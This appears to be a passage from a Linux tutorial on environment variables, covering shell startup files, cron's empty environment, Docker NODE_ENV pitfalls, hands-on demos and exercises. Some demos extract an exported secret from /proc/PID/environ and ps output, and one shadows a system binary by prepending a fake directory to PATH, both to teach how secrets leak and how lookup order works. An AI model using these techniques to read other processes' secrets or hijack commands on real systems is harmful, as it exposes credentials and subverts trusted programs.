**Wrong:** `echo $SHELL` → `/bin/bash`, so you edit `~/.bashrc`… and the alias never shows up.
**Right:** `ps -p $$ -o comm=` → `zsh`. You've been in zsh the whole time. Edit `~/.zshrc`.

**Root cause:** `SHELL` is set at login from your **`/etc/passwd` entry** — your *login* shell. It is never updated when you type `zsh`, `sh`, or `docker exec -it ... bash`. It answers "what shell would this user get at login," not "what shell am I in." The truth: `ps -p $$ -o comm=`, or on Linux `readlink /proc/$$/exe`.

---

### Mistake 6 — `NODE_ENV=production` too early in a Dockerfile

```dockerfile
# ❌ WRONG                              # ✅ RIGHT — multi-stage
FROM node:18                            FROM node:18 AS build
ENV NODE_ENV=production  # ← too early  COPY package*.json ./
COPY package*.json ./                   RUN npm ci        # NODE_ENV unset → devDeps IN
RUN npm ci   # npm SKIPS devDeps!       COPY . . && RUN npm run build
RUN npm run build                       #
# ✗ "tsc: not found" — typescript       FROM node:18-slim
#   was a devDependency                 ENV NODE_ENV=production  # ← only in the RUNTIME stage
                                        COPY --from=build /app/dist ./dist
                                        RUN npm ci --omit=dev    # explicit, not implicit
                                        CMD ["node", "dist/server.js"]
```

**Root cause:** `NODE_ENV` isn't special to Node — but **npm reads it**, and `production` makes `npm ci` behave like `--omit=dev`. An environment variable with an invisible side effect on your dependency tree.

---

## Hands-On Proof

```bash
# PROVE IT: the environment is a NUL-separated byte blob in process memory
cat /proc/self/environ | tr '\0' '\n' | head
cat /proc/self/environ | od -c | head -3          # the \0 separators, made visible

# PROVE IT: every process has its OWN copy — they diverge and never merge back
export MARKER=parent
bash -c 'echo "child got: $MARKER"; export MARKER=child; echo "child set: $MARKER"'
echo "parent is still: $MARKER"                   # parent   ← the one-way door

# PROVE IT: shell vars are NOT in the environment; exported ones are
LOCAL_ONLY=1; export EXPORTED=1
env | grep -E '^(LOCAL_ONLY|EXPORTED)='           # only EXPORTED=1 appears
declare -p LOCAL_ONLY EXPORTED
# declare -- LOCAL_ONLY="1"    ← no -x        declare -x EXPORTED="1"   ← -x = exported

# PROVE IT: execve() is literally where the environment is handed over
strace -f -e trace=execve -s 200 env FOO=bar true 2>&1 | grep execve
# execve("/usr/bin/env", ["env","FOO=bar","true"], 0x7ffd... /* 24 vars */) = 0
# execve("/bin/true",    ["true"],                 0x55a...  /* 25 vars */) = 0
#                                          24 → 25: env ADDED FOO=bar. That third
#                                          argument IS the environment.

# PROVE IT: source does not fork; executing does
echo 'echo "  running as PID $$"' > /tmp/who.sh ; echo "my shell is PID $$"
bash   /tmp/who.sh        # DIFFERENT PID → a new process ran it
source /tmp/who.sh        # SAME PID      → no fork. YOUR shell ran it.

# PROVE IT: a non-interactive bash reads NO startup files (this IS the cron bug)
echo 'echo "BASHRC WAS SOURCED"' >> ~/.bashrc
bash -i -c true           # interactive     → prints "BASHRC WAS SOURCED"
bash    -c true           # non-interactive → prints NOTHING
sed -i '$ d' ~/.bashrc    # undo (delete the last line)

# PROVE IT: cron's near-empty environment, simulated
env -i /bin/sh -c 'echo "PATH=[$PATH] HOME=[$HOME]"; node -v'
# PATH=[] HOME=[]  /bin/sh: 1: node: not found     ← your cron job, on demand

# PROVE IT: exported secrets are readable by you, by root, and by anything you run
export MY_SECRET=hunter2; sleep 300 &
strings /proc/$!/environ | grep MY_SECRET         # MY_SECRET=hunter2 — sleep inherited it
ps e -p $! | tr ' ' '\n' | grep MY_SECRET         # MY_SECRET=hunter2 — and ps prints it
kill $!

# PROVE IT: PATH is searched left-to-right, first match wins
mkdir -p /tmp/fake && printf '#!/bin/sh\necho "I AM THE FAKE"\n' > /tmp/fake/date
chmod +x /tmp/fake/date
PATH="/tmp/fake:$PATH" date      # I AM THE FAKE     ← prepended: it wins
PATH="$PATH:/tmp/fake" date      # Sat Jul 12 ...    ← appended: the real date wins
type -a date                     # shows EVERY match, in PATH order
rm -rf /tmp/fake
```

---

## Practice Exercises

### Exercise 1 — Easy

```bash
# 1. Create a shell variable MY_VAR (no export).
# 2. Prove it is NOT in the environment — TWO different ways.
# 3. Export it. Prove it IS now — two different ways.
# 4. Launch a child shell, change MY_VAR inside it, exit, show the parent is unchanged.
# 5. Find MY_VAR inside /proc/self/environ.
```

**Question:** which two commands did you use in step 2 — and why does `echo $MY_VAR` **not** count as proof?

---

### Exercise 2 — Medium

Reproduce and fix the cron bug — without using cron.

```bash
# 1. Write /tmp/job.sh:   cd /tmp && node -e 'console.log(process.env.APP_NAME)'
# 2. export APP_NAME=demo, then run it normally. It prints "demo".
# 3. Now run it the way CRON would:
#      env -i PATH=/usr/bin:/bin HOME="$HOME" /bin/sh -c /tmp/job.sh
#    Observe BOTH failures: node not found, and (once that's fixed) APP_NAME undefined.
# 4. Fix the script so it works under `env -i` with nothing but HOME set.
#    Constraints: absolute path to node; load APP_NAME from a chmod-600 /tmp/job.env.
# 5. Verify:  env -i HOME="$HOME" /bin/sh -c /tmp/job.sh
```

**Deliverable:** the final `/tmp/job.sh`, the `ls -l` of `/tmp/job.env`, and the passing run.

---

### Exercise 3 — Hard (Production Simulation)

The previous dev left both a `~/.bash_profile` **and** a `~/.profile`, and swears "my PATH works over SSH but not in the terminal — or maybe the other way round, I forget."

```bash
# 1. Determine WITH A COMMAND (not by reading docs) whether your current shell is
#    (a) login       → shopt -q login_shell; echo $?
#    (b) interactive → [[ $- == *i* ]]; echo $?
# 2. Instrument every startup file: add `echo "==> read <filename>"` to the TOP of
#    ~/.bash_profile, ~/.profile, ~/.bashrc  (and /etc/profile if you have sudo).
# 3. Record EXACTLY which files are read, in order, for each of:
#      a) bash -l -i -c true      (login + interactive — simulates ssh)
#      b) bash -i -c true         (interactive, non-login — simulates a new tab)
#      c) bash -c true            (non-interactive — simulates cron/systemd)
#      d) ssh localhost 'echo hi' (if sshd is running)
# 4. Explain from your recording why ~/.profile was (or was not) read AT ALL.
# 5. Build the CORRECT setup: exports in one file, aliases in the other, plus the
#    one-line bridge in ~/.bash_profile. Re-run (a),(b),(c) and prove your aliases
#    AND your PATH are present in both (a) and (b), and that (c) still reads nothing.
# 6. Clean up your echo lines.
```

**Deliverable:** the table of which file was read in each of the four cases, plus your final dotfile layout.

---

## Mental Model Checkpoint

1. **What EXACTLY is "the environment" at the kernel level, and which argument of which syscall carries it?**
2. **Why can a child process never change its parent's environment? Is it a permissions problem?**
3. **What is the difference between `X=1`, `export X=1`, and `X=1 command`? What does a child see in each case?**
4. **Why does `source ~/.bashrc` work but `./.bashrc` doesn't? What does `source` do differently at the process level?**
5. **Your cron job says `node: command not found` but the same script works over SSH. Explain the exact mechanism, and give two fixes.**
6. **Which startup files does bash read for (a) an SSH login, (b) a new terminal tab on Linux, (c) `bash script.sh`?**
7. **Name three places a secret you `export`ed on the command line is now visible.**
8. **Why is `ENV NPM_TOKEN=...` in a Dockerfile permanently dangerous, even if a later layer unsets it?**

---

## Quick Reference Card

| Command | What It Does | Key Flags / Notes |
|---|---|---|
| `export X=v` | Set var **and** mark it for the environment | `-n` un-export (keeps value), `-p` list all exported |
| `X=v` | Shell variable only — **not** inherited | No spaces around `=` |
| `X=v cmd` | One-shot: set `X` in `cmd`'s environment only | The cleanest single-run override |
| `unset X` | Delete the variable entirely | Name only — **no `$`** |
| `env` | Print the environment (env vars only — honest) | `-i` empty env, `-u X` remove X, `env X=1 cmd` |
| `printenv X` | Print one env var; **exits 1** if unset | Scriptable, unlike `echo $X` |
| `set` | Shell vars + env vars + **function bodies** — huge | `set -a` auto-export all; `set -o` show options |
| `declare -x` | List exported vars | `declare -p X` → value + attributes |
| `source f` / `. f` | Run `f` **in the current shell** — no fork | The only way a script can change your shell |
| `type -a cmd` | Every PATH match, in order | Reveals shadowed binaries; knows builtins/aliases |
| `cat /proc/self/environ` | The raw environment bytes | Pipe through `tr '\0' '\n'` |
| `strings /proc/PID/environ` | Another process's environment | Same user, or root |
| `ps e -p PID` | A process's environment | Works on macOS too (`ps eww`) |
| `env -i CMD` | Run with an **empty** environment | **The** cron/systemd debugging tool |

| Shell type | Example | Files read |
|---|---|---|
| Login + interactive | `ssh host`, TTY login, macOS Terminal window | `/etc/profile` → **first of** `~/.bash_profile`, `~/.bash_login`, `~/.profile` |
| Interactive, non-login | new tab on Linux, `bash` inside bash | `/etc/bash.bashrc` → `~/.bashrc` |
| Non-interactive | `bash script.sh`, cron, systemd, `ssh host cmd`, Docker `RUN` | **NOTHING** |
| zsh (macOS default) | — | `.zshenv` (always) → `.zprofile` (login) → `.zshrc` (interactive) |

---

## When Would I Use This at Work?

### Scenario 1: The heap-limit OOM on a big container
The box has 8 GB but `npm run build` dies with `FATAL ERROR: Reached heap limit — JavaScript heap out of memory`. V8's default old-space cap sits far below the container's RAM, so **Node kills itself long before the kernel would**. You don't rewrite the build — you set `NODE_OPTIONS=--max-old-space-size=6144`. Knowing this is a *process environment variable* (not a Node config file) is what lets you apply it identically in a Dockerfile, a systemd unit, and a CI job.

### Scenario 2: "It works locally but the deploy user can't find pm2"
CI runs `ssh deploy@prod 'pm2 reload app'` → `pm2: command not found`. `ssh host 'command'` is a **non-interactive** shell: no `.bashrc`, no nvm, no `PATH`. Exactly the cron bug wearing a different hat. Fix: absolute path — or better, stop shelling in and let systemd own the process (topic **22**).

### Scenario 3: A secret leaked — find the blast radius
Someone `export`ed a production DB password on the command line six months ago. Inheritance tells you precisely what's contaminated: `~/.bash_history` (grep it), `/proc/PID/environ` of **every long-running process forked from that shell** (they all got a copy — and so did *their* children), every image built since (`docker history` — did an `ENV` bake it in?), and any error tracker that captured `process.env` on a crash.

---

## Connected Topics

| Direction | Topic | Why |
|---|---|---|
| **Builds on** | 07 — How the Shell Works | The fork/exec model IS the mechanism of inheritance; `envp[]` is the third argument to the `execve()` you learned there |
| **Builds on** | 13 — Shell Scripting Fundamentals | `set -a`, `set -euo pipefail`, and `${X:-default}` appear in every real env-handling script |
| **Builds on** | 05 — File Permissions in Depth | `chmod 600 .env` is the whole security model for a secrets file; `/proc/PID/environ` permissions are why same-user processes can read your secrets |
| **Builds on** | 02 — The Filesystem Hierarchy | `/proc` is the virtual filesystem where the kernel exposes each process's environment |
| **Next** | 15 — Shell Shortcuts & Productivity | `HISTCONTROL=ignorespace` is itself an environment variable — and it's how you keep a secret out of your history |
| **Used by** | 20 — Cron and Scheduled Tasks | The empty-environment problem is cron's defining failure mode |
| **Used by** | 22 — Services and systemd | `Environment=` / `EnvironmentFile=` — and why a service must be **restarted** (re-exec'd) to pick up a change |
| **Used by** | 16 — Processes / 19 — File Descriptors | The environment and open fds are both inherited across fork/exec — same mechanism, same mental model |
| **Used by** | 33 — Node.js in Production | `NODE_ENV`, `PORT`, `DATABASE_URL`, `NODE_OPTIONS` are the entire config surface of a twelve-factor Node app |
